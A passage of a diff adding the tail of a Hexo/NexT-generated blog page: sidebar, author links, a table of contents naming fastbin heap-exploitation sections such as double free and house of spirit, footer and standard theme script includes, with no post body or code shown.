+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">binpang</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">34</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">30</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/bin2415" title="GitHub &rarr; https://github.com/bin2415" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:pangbin2415@gmail.com" title="E-Mail &rarr; mailto:pangbin2415@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景介绍"><span class="nav-number">1.</span> <span class="nav-text">背景介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastbin漏洞利用"><span class="nav-number">2.</span> <span class="nav-text">fastbin漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fastbin-double-free"><span class="nav-number">2.1.</span> <span class="nav-text">fastbin double free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fast-bin-double-free-in-stack"><span class="nav-number">2.2.</span> <span class="nav-text">fast bin double free in stack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#The-house-of-spirit"><span class="nav-number">2.3.</span> <span class="nav-text">The house of spirit</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">binpang</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> v6.6.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script src="/lib/three/three.min.js"></script>
+  
+
+  
+  
+    <script src="/lib/three/three-waves.min.js"></script>
+  
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
